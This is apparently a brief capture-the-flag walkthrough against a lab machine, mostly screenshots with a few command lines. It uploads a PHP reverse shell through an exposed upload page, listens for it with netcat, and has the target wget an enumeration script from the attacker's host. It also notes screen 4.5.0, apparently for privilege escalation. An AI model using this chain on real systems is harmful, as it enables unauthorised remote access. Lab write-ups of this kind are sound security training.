```
/exposed.php
php-reverse-shell
10.10.10.24/uploads/shell2.php
LinEnum.sh
screen 4.5.0
```


![image](https://user-images.githubusercontent.com/33616880/232672538-d984aa25-984f-4c22-a5f8-920f3bb79b0e.png)


![image](https://user-images.githubusercontent.com/33616880/232672567-b4f1c8a8-e121-4e29-a5b2-098f4b4c1eb6.png)


```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
diff -u php-reverse-shell.php shell.php
```
![image](https://user-images.githubusercontent.com/33616880/232672632-55eefa42-eeca-4a5d-8c7c-78a35e18a674.png)


![image](https://user-images.githubusercontent.com/33616880/232672650-896870d9-0dc1-48aa-b837-caff93bc9395.png)
![image](https://user-images.githubusercontent.com/33616880/232672663-f4ba2bfc-05b6-477e-adc8-db3233da4304.png)
![image](https://user-images.githubusercontent.com/33616880/232672710-cc23e9e5-cb37-4688-8c01-969cf7b733c5.png)


```
10.10.10.24/uploads/shell2.php
nc –nvlp 1234
```
![image](https://user-images.githubusercontent.com/33616880/232672763-7d4d30a4-0d52-434a-8edb-5984d4895ad3.png)
![image](https://user-images.githubusercontent.com/33616880/232672771-b9749b20-aafe-4399-a658-b2a007362aca.png)
![image](https://user-images.githubusercontent.com/33616880/232672782-d9bd0ec8-b82f-441b-be71-8bdd4c9c3ec0.png)


```
python3 -m http.server 80
wget 10.10.14.2/LinEnum.sh
```
![image](https://user-images.githubusercontent.com/33616880/232672837-a43f9b03-ecb6-4c16-8966-9c8493c37512.png)
![image](https://user-images.githubusercontent.com/33616880/232672832-8c3e1108-d6fe-40e7-b4f0-84dce04e3aea.png)


![image](https://user-images.githubusercontent.com/33616880/232672851-82bd17f0-17fc-452e-8082-ea19d7afd45f.png)
![image](https://user-images.githubusercontent.com/33616880/232672860-72151f75-c0e3-46f7-ba0c-22f08b39ec86.png)
